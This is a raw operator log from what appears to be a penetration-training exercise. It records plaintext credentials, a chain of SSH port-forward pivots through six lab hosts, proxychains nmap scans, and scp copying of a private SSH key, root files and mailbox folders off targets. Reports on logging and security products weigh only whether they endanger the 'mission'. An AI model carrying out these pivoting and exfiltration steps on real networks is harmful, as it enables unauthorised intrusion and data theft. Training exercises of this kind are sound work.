# BB01-Op

Op: BB01
Date: 25/03/24
Start Time: 9:00AM
End Time: 3:00PM


SOM:
>T1: 10.50.33.117
->T2: 10.20.169.13
-->T3: 10.20.169.239
--->T4: 192.186.169.133
---->T5: 10.101.169.30
---->T6: 10.101.169.35


Creds:
engineer12
enshallah

caisson12
tread_depth

NOC_Admin12
AhmdLxu29D

askar12
DaXedayLasarah

=========================
T1: 10.50.33.117
=========================
X-----------------------
2024-03-25 08:59:21-- ssh -MS /tmp/T1 -p10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer12@10.50.33.117

2024-03-25 08:59:22-- connected

2024-03-25 08:59:26-- vetting

2024-03-25 09:00:12-- date; date -u
Mon Mar 25 13:01:11 UTC 2024

2024-03-25 09:00:32-- uname -a
Linux ext-rtr 4.18.0-240.1.1.el8_3.x86_64 #1 SMP Thu Nov 19 17:20:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

2024-03-25 09:06:11-- cat /etc/rsyslog.conf
*.* @10.50.22.142:514

2024-03-25 09:13:57-- initial vet complete

2024-03-25 14:50:17-- exit vetting
/run/systemd/users/1012
/var/log/lastlog
/var/log/cron
/var/log/wtmp
/run/utmp
/var/log/secure
/var/log/messages
/run/log/journal/2e418f69afa746258899018f7cb8f871/system.journal

2024-03-25 14:54:04-- exit vet complete

2024-03-25 14:54:35-- exit

------------------------X
=========================

=========================
T2: 10.20.169.13
=========================
X-----------------------
2024-03-25 09:14:57-- ssh -S /tmp/T1 -O forward -L127.0.0.1:2222:10.20.169.13:52203 dummy
2024-03-25 09:15:07-- ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson12@127.0.0.1

2024-03-25 09:15:34-- connected

2024-03-25 09:15:37-- vetting

2024-03-25 09:16:23-- date /t
Mon 03/25/2024

2024-03-25 09:16:47-- time /t
01:17 PM

2024-03-25 09:18:13-- query user
USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 administrator         console             1  Active      none   3/25/2024 12:01 PM

2024-03-25 09:35:32-- certutil -hashfile C:\Users\Administrator\Downloads\rk__free__ins
tall_302.exe MD5
6f12b81f9c8c1a63fd3d2de19abe0fae

2024-03-25 09:40:39-- dir /o:d /t:w c:\windows\temp
Hello Intruder!

2024-03-25 09:57:47-- initial vet complete

2024-03-25 14:47:41-- exit vetting
State.evtx
Microsoft-Windows-User Profile Service%4Operational.evtx
Security.evtx
Application.evtx

2024-03-25 14:49:33-- exit vet complete

2024-03-25 14:49:57-- exit

------------------------X
=========================

=========================
T3: 10.20.169.239
=========================
X-----------------------
2024-03-25 10:01:14-- ssh -S /tmp/T2 -O forward -L127.0.0.1:3333:10.20.169.239:52230 dummy
2024-03-25 10:01:26-- ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin12@127.0.0.1

2024-03-25 10:01:48-- connected

2024-03-25 10:01:53-- vetting

2024-03-25 10:02:29-- date; date -u
Mon Mar 25 14:02:02 UTC 2024

2024-03-25 10:02:48-- uname -a
Linux Vyos2 3.13.11-1-amd64-vyos #1 SMP Wed Aug 12 02:08:05 UTC 2015 x86_64 GNU/Linux

2024-03-25 10:07:05-- sudo netstat -auntp
tcp        0      0 192.186.169.206:58199   192.186.169.133:33175   ESTABLISHED 15729/0

2024-03-25 10:11:40-- initial vet complete

2024-03-25 14:44:24-- exit vetting
/var/run/utmp
/var/log/wtmp
/var/log/auth.log

2024-03-25 14:46:37-- exit vet complete

2024-03-25 14:47:21-- exit

------------------------X
=========================

=========================
T4: 192.186.169.133
=========================
X-----------------------
2024-03-25 10:31:10-- ssh -S /tmp/T3 -O forward -L127.0.0.1:4444:192.186.169.133:33517 dummy
2024-03-25 10:31:24-- ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar12@127.0.0.1

2024-03-25 10:31:48-- connected

2024-03-25 10:31:51-- vetting

2024-03-25 10:33:04-- date; date -u
Mon Mar 25 14:34:05 UTC 2024
3389/tcp open  ms-wbt-server Microsoft Terminal Services
2024-03-25 10:33:23-- uname -a
Linux DESKTOP-ADMIN2 4.18.0-240.1.1.el8_3.x86_64 #1 SMP Thu Nov 19 17:20:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

2024-03-25 10:37:31-- sudo ls -latr /root/Sup3rS3cr3t
-rw-r--r--. 1 root root 1014 Feb  7 19:12 S3cr3tSqu1r1.stuff
-rw-r--r--. 1 root root 1000 Feb  7 19:12 S3cr3tSqu1r2.stuff
-rw-r--r--. 1 root root   17 Feb  7 19:12 S3cr3tSqu1r12.stuff
-rw-r--r--. 1 root root   12 Feb  7 19:12 S3cr3tSqu1r13.stuff
-rw-r--r--. 1 root root 1000 Feb  7 19:12 S3cr3tSqu1r3.stuff
-rw-r--r--. 1 root root   20 Feb  7 19:12 S3cr3tSqu1r14.stuff
drwxr-xr-x. 2 root root  191 Feb  7 19:12 .
-rw-r--r--. 1 root root 1000 Feb  7 19:12 S3cr3tSqu1r4.stuff

2024-03-25 10:52:52-- ls -latr /var/*/*acc*
-rw-------. 1 root root 40512 Mar 25 14:53 /var/account/pacct

2024-03-25 11:05:13-- scp -r -P 4444 -o ControlPath=/tmp/T4 askar12@192.186.169.133:/home/useraccounts/askar12/.ssh/ /student12_25-03-24_BB01

Local:
2024-03-25 11:09:05-- md5sum id_rsa.pub
60f76dca4c820577a205c384a942bb65

2024-03-25 11:09:09-- md5sum id_rsa
aeb9f4b3be41fc4cc701ee916740d03f

2024-03-25 11:16:27-- md5sum T4_S3cr3tSqu1r1.stuff
c96f01f43539f6a617030ab485635649

2024-03-25 11:16:42-- md5sum T4_S3cr3tSqu1r2.stuff
d1e3b2f8fed21ec4754164c12df6633e

2024-03-25 11:16:54-- md5sum T4_S3cr3tSqu1r12.stuff
cc58b9a36085d986929c423cde377e1c

2024-03-25 11:17:06-- md5sum T4_S3cr3tSqu1r13.stuff
1f24db009392e4783c7b337faf7d3ed8

2024-03-25 11:17:22-- md5sum T4_S3cr3tSqu1r3.stuff
ef45b65bce21b76f25bdbd7d078e792b

2024-03-25 11:17:30-- md5sum T4_S3cr3tSqu1r14.stuff
e7b757f5335f10293d37b4cf69627799

2024-03-25 11:17:40-- md5sum T4_S3cr3tSqu1r4.stuff
957f4cb477fa9822f28913211753e7ef

Remote:
2024-03-25 11:24:34-- md5sum /home/useraccounts/askar12/.ssh/id_rsa.pub
60f76dca4c820577a205c384a942bb65

2024-03-25 11:24:48-- md5sum /home/useraccounts/askar12/.ssh/id_rsa
aeb9f4b3be41fc4cc701ee916740d03f

2024-03-25 11:26:04-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r1.stuff
228bf6c4514b764a36f7abae85b4f611

2024-03-25 11:27:08-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r2.stuff
5bb8525345538c2e58698b1f6a9446f7

2024-03-25 11:27:20-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r12.stuff
cc58b9a36085d986929c423cde377e1c

2024-03-25 11:27:28-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r13.stuff
1f24db009392e4783c7b337faf7d3ed8

2024-03-25 11:27:38-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r3.stuff
cdd1cfe5862348e4ecae174d1c4396c5

2024-03-25 11:27:57-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r14.stuff
e7b757f5335f10293d37b4cf69627799

2024-03-25 11:27:59-- sudo md5sum /root/Sup3rS3cr3t/S3cr3tSqu1r4.stuff
1696e662c89d01c302cd2e5768a5f106

2024-03-25 11:31:32-- beginning survey

2024-03-25 11:40:51-- survey complete


2024-03-25 11:43:34-- ssh -S /tmp/T4 authgarbage -O forward -D 9050

2024-03-25 11:47:08-- proxychains nmap -Pn -sT -sV -T3 -p52000-52999 192.186.169.206
PORT      STATE SERVICE VERSION
52230/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

2024-03-25 11:51:14-- proxychains nmap -Pn -sT -sV -T3 -p1-1000,3389 10.101.169.30
PORT    STATE SERVICE     VERSION
135/tcp open  msrpc       Microsoft Windows RPC
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

2024-03-25 11:59:55-- proxychains nmap -Pn -sT -sV -T3 -p33000-33999 10.101.169.30
PORT      STATE SERVICE VERSION
33501/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)

2024-03-25 12:00:30-- proxychains nmap -Pn -sT -sV -T3 -p33000-33999 10.101.169.35
PORT      STATE SERVICE VERSION
33501/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)

2024-03-25 11:52:45-- proxychains nmap -Pn -sT -sV -T3 -p1-1000 10.101.169.35
111 (sunrpc) open

2024-03-25 14:39:48-- exit vetting
/var/log/wtmp
/run/utmp
/var/log/messages
/var/lib/sss/mc/passwd
/var/lib/sss/mc/group
/var/log/secure
/run/log/journal/278a5cb9eec4467ab9bc89770c427da5/system.journal
/var/account/pacct

2024-03-25 14:43:14-- exit vet complete

2024-03-25 14:43:49-- exit

------------------------X
=========================

=========================
T5: 10.101.169.30
=========================
X-----------------------
2024-03-25 12:18:07-- ssh -S /tmp/T4 -O forward -L127.0.0.1:5555:10.101.169.30:33501 dummy
2024-03-25 12:18:35-- ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar12@127.0.0.1

2024-03-25 12:19:01-- connected

2024-03-25 12:19:04-- vetting

2024-03-25 12:19:34-- date /t
Mon 03/25/2024

2024-03-25 12:19:45-- time /t
04:21 PM

2024-03-25 12:22:53-- net user
Admin                    Administrator            askar1
askar10                  askar11                  askar12
askar13                  askar14                  askar15
askar16                  askar17                  askar18
askar19                  askar2                   askar20
askar21                  askar22                  askar23
askar3                   askar4                   askar5
askar6                   askar7                   askar8
askar9                   cloudbase-init           DefaultAccount
Guest                    sshd                     WDAGUtilityAccount

2024-03-25 13:25:02-- start survey

2024-03-25 13:43:04-- survey complete

2024-03-25 14:00:26-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\Air Defense\*"' /student12_25-03-24_BB01

2024-03-25 14:04:51-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\Armored Cavalry\*"' /student12_25-03-24_BB01/T4_Armored_Cavalry

2024-03-25 14:05:08-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\Command Elements\*"' /student12_25-03-24_BB01/T4_Command_Elements

2024-03-25 14:05:20-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\Cyber-Comms Detachment\*"' /student12_25-03-24_BB01/T4_Cyber-Comms_Detatchment

2024-03-25 14:05:49-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\Ground Forces\*"' /student12_25-03-24_BB01/T4_Ground_Forces

2024-03-25 14:06:37-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\R&D\*"' /student12_25-03-24_BB01/T4_RnD

2024-03-25 14:06:50-- scp -r -T -P 5555 -o ControlPath=/tmp/T5 askar12@10.101.169.30:'"c:\Program Files (x86)\hMailServer\Data\Workgroup\Supply\*"' /student12_25-03-24_BB01/T4_Supply

2024-03-25 14:37:03-- exit vetting
State.evtx
Microsoft-Windows-User Profile Service%4Operational.evtx
Security.evtx
Application.evtx

2024-03-25 14:39:13-- exit vet complete

2024-03-25 14:39:40-- exit

------------------------X
=========================

=========================
T6: 10.101.169.35
=========================
X-----------------------
2024-03-25 14:09:56-- ssh -S /tmp/T4 -O forward -L127.0.0.1:6666:10.101.169.35:33501 dummy
2024-03-25 14:10:08-- ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar12@127.0.0.1

2024-03-25 14:10:27-- connected

2024-03-25 14:10:31-- vetting

2024-03-25 14:11:01-- date; date -u
Mon Mar 25 18:12:00 UTC 2024

2024-03-25 14:11:21-- uname -a
Linux DESKTOP-EMAIL4 4.18.0-240.1.1.el8_3.x86_64 #1 SMP Thu Nov 19 17:20:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

2024-03-25 14:20:27-- w
askar23  pts/0    10.101.169.38    12:52    6:34   0.05s  0.05s -bash
askar12  pts/1    10.101.169.38    18:11    0.00s  0.04s  0.00s w
askar21  pts/2    10.101.169.38    18:02    1:30   0.04s  0.04s -bash
askar17  pts/3    10.101.169.38    18:02    1:17   0.06s  0.06s -bash
askar3   pts/4    10.101.169.38    18:18   12.00s  0.06s  0.06s -bash
askar15  pts/5    10.101.169.38    17:49   49.00s  0.09s  0.09s -bash
askar6   pts/6    10.101.169.38    17:51    3.00s  0.08s  0.08s -bash
askar1   pts/7    10.101.169.38    18:12   10.00s  0.01s  0.01s -bash
askar13  pts/8    10.101.169.38    18:13   56.00s  0.03s  0.03s -bash
askar20  pts/9    10.101.169.38    18:13   21.00s  0.02s  0.02s -bash


2024-03-25 14:28:30-- initial vet complete

2024-03-25 14:32:55-- exit vetting
/run/systemd/users/1012
/var/log/lastlog
/var/lib/sss/mc/initgroups
/var/log/wtmp
/var/log/messages
/var/log/secure
/run/log/journal/f7aa7f436e714656841c3d46d2e311c7/system.journal

2024-03-25 14:35:59-- exit vet complete

2024-03-25 14:36:46-- exit

------------------------X
=========================

*****T1 / 10.50.33.117 Abnormal Logging*****
Provide process name/options, PID, Parent ID, user
        rsyslog, 5434, 1, root
Provide location of configuration file and it's abnormal or irregular contents
        /etc/rsyslog.conf
        *.* @@10.50.22.142:514
Provide hostname or IP of where logs are being sent
        10.50.22.142:514
Provide any network connections opened/established by abnormal logging
        NA
Provide brief description of the abnormal, irregular or remote logging and a link to open source     documentation if available.
        rsyslog logs remote connections to T1 sent to 10.50.22.142 on port 514, no active conenction
Recommendation
        Continue mission, changing log is suspicious and connection to T1 has already been established, along with no active connection to remote IP.


///////////////////////////////////////////////////////////////////////////////////////


*****T2 Privileged User Report*****
Target - Where did you see this user?
        T2 / 10.20.169.13
User - What is their username?
        administrator
Access time - How long have they been on?
        12:01PM (local box time is 01:17PM)
Access method - Did they access locally? Remotely?
    Provide all relevant details
        Local console
Privileges - What are they capable of doing?
        Admin privileges
Activity - What are they currently doing?
        Running following programs:
taskhostw.exe
cmd.exe
conhost.exe
rk__free__install_302.exe
rkfree_setup64.exe
Recommendation
        Continue mission, will be vigilant of cmd prompt they have open and operator will investigate and triage possible malware running.


*****Malware Report*****
Target: T2 / 10.20.169.13
Provide process name/options, PID, Parent ID, user, and hash
rk__free__install_302.exe, 3656, 3172, administrator, 6f12b81f9c8c1a63fd3d2de19abe0fae 
Provide file type of malware binary and supporting files
Win32 EXE / trojan spyware, C:\Users\Administrator\Downloads\rk__free__install_302.exe
C:\Users\ADMINI~1\AppData\Local\Temp\1\rkfree_setup\rkfree_setup64.exe
Provide any associated logs generated by malware
NA
Provide location and lines of any persistence mechanisms
C:\Users\ADMINI~1\AppData\Local\Temp\1\rkfree_setup\rkfree_setup64.exe
Provide full path of malware files or support files
C:\Users\Administrator\Downloads\rk__free__install_302.exe
C:\Users\ADMINI~1\AppData\Local\Temp\1\rkfree_setup\rkfree_setup64.exe
Provide any network connections opened/established by malware
NA
Provide any identifiable text
NA
Provide any/all modules/.dlls/etc loaded by malware
NA
Provide brief description of malware purpose/actions and capabilities, a link to open source documentation if available
Malware appears to be a spyware keylogger, PPID shows it was run by administrator cmd prompt, persistence is run in C:\Users\ADMINI~1\AppData\Local\Temp\1\rkfree_setup\rkfree_setup64.exe
https://www.virustotal.com/gui/file/46daa1444c0305ef1b691380afd049b7e3868b46aeb9e74a5f7ac43d81b726b6/details
Recommendation
Continue mission, no operator action should jeopardize any tools or access methods
*****End of Report*****


///////////////////////////////////////////////////////////////////////////


*****T4 / 192.186.169.133 Abnormal Logging*****
Provide process name/options, PID, Parent ID, user
        pacct, NA, NA, root
Provide location of configuration file and it's abnormal or irregular contents
        /var/account/pacct
Provide hostname or IP of where logs are being sent
        Logs saved locally to /var/account/pacct
Provide any network connections opened/established by abnormal logging
        NA
Provide brief description of the abnormal, irregular or remote logging and a link to open source     documentation if available.
        Pacct is running in /var/account/pacct and is logging in that file. 
https://www.oreilly.com/library/view/practical-unix-and/0596003234/ch21s02.html
Recommendation
        Continue mission, turning this function off is suspicious, and there are no tools being used that would be compromised by this function.
*****End of Report*****


/////////////////////////////////////////////////////////////////////////
*****T5 / 10.101.169.30 Security Product Report*****
Name and version of the product
COMODO version 12.2.2.8012
Installation folder
C:\comodo.exe
C:\Program Files\COMODO\COMODO Internet Security\
C:\Program Files (x86)\Comodo\Dragon\dragon.exe
Directory location of associated logs
c:\windows\temp\Comodo LogsFolder\
Timestamp of all associated log files
NA
Cloud based?; yes or no
No
Can we read the logs?; yes or no
    If Yes, put the most recent 5 lines of logs in your NSDB File
    If No, why?
NA
Recommendation 
Continue mission, initial access has already been gained and COMODO is not a currently running process and should not interfere with mission.



//////////////////////////////////////////////////////////////////////////////

*****T6 / 10.101.169.35 Abnormal Logging*****
Provide process name/options, PID, Parent ID, user
        rsyslog, 1002, 1, root
Provide location of configuration file and it's abnormal or irregular contents
        /etc/rsyslog.conf
        *.* @@remote-host:514
Provide hostname or IP of where logs are being sent
        10.123.111.35 mail.badguy.com
Provide any network connections opened/established by abnormal logging
        NA
Provide brief description of the abnormal, irregular or remote logging and a link to open source     documentation if available.
        rsyslog logs remote connections to T6 sent to 10.1213.111.35 on port 514, no active conenction
Recommendation
        Continue mission, changing log is suspicious and connection to T1 has already been established, along with no active connection to remote IP.


*****T5 / 10.101.169.30 Security Product Report*****
Name and version of the product
        SELinux version 32
Installation folder
        /etc/selinux
Directory location of associated logs
        /var/log/audit.log
Timestamp of all associated log files
        1707333036.317:103
1707333037.944:104
1711390283.305:3920
1711390283.311:3921
1711390283.315:3923
1711390283.316:3924
1711390283.317:3925
1711390283.350:3927
1711390283.351:3929
1711390283.351:3930
1711390283.389:3932
1711390283.391:3933
1711390283.391:3934
1711390283.391:3935
1711390283.392:3936
1711390283.436:3937
1711390283.436:3938
1711390283.438:3939
1711390386.416:4035
1711390386.416:4036
1711390386.417:4037
1711390386.420:4038
1711390386.423:4039
1711390386.423:4040
1711390425.024:4096
1711390425.024:4097
1711390425.025:4098
1711390425.027:4099
1711390425.038:4100
1711390425.038:4101
1711390442.014:4108
1711390442.015:4109
1711390442.015:4110
1711390442.017:4111
1711390442.019:4112
1711390442.019:4113
1711391293.549:4923
1711391293.549:4924
1711391293.549:4925
1711391293.552:4926
1711391293.554:4927
1711391293.554:4928
1711391302.730:4935
1711391302.730:4936
1711391302.731:4937
1711391302.733:4938
1711391302.734:4939
1711391302.735:4940
1711391336.793:4971
1711391336.793:4972
1711391336.794:4973
1711391336.795:4974
1711391336.797:4975
1711391336.797:4976
1711391355.336:4983
1711391355.336:4984
1711391355.336:4985
1711391355.338:4986
1711391355.357:4987
1711391355.357:4988
1711391365.160:4989
1711391365.161:4990
1711391365.161:4991
1711391365.162:4992
1711391365.165:4993
1711391365.165:4994
1711391367.385:5001
1711391367.385:5002
1711391367.386:5003
1711391367.388:5004
Cloud based?; yes or no
        No
Can we read the logs?; yes or no
    If Yes, put the most recent 5 lines of logs in your NSDB File
    If No, why?
        type=CRED_DISP msg=audit(1711391365.165:4994): pid=35599 uid=0 auid=1012 ses=23 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal=/dev/pts/1 res=success'UID="root" AUID="askar12"
type=USER_ACCT msg=audit(1711391367.385:5001): pid=35606 uid=1012 auid=1012 ses=23 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_unix,pam_localuser acct="askar12" exe="/usr/bin/sudo" hostname=? addr=? terminal=/dev/pts/1 res=success'UID="askar12" AUID="askar12"
type=USER_CMD msg=audit(1711391367.385:5002): pid=35606 uid=1012 auid=1012 ses=23 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd="/home/useraccounts/askar12" cmd=636174202F7661722F6C6F672F61756469742F61756469742E6C6F67 exe="/usr/bin/sudo" terminal=pts/1 res=success'UID="askar12" AUID="askar12"
type=CRED_REFR msg=audit(1711391367.386:5003): pid=35606 uid=0 auid=1012 ses=23 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal=/dev/pts/1 res=success'UID="root" AUID="askar12"
type=USER_START msg=audit(1711391367.388:5004): pid=35606 uid=0 auid=1012 ses=23 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_open grantors=pam_keyinit,pam_limits,pam_systemd,pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal=/dev/pts/1 res=success'UID="root" AUID="askar12"
Recommendation
        Continue mission, initial access has already been gained and SELinux should not interfere with mission.
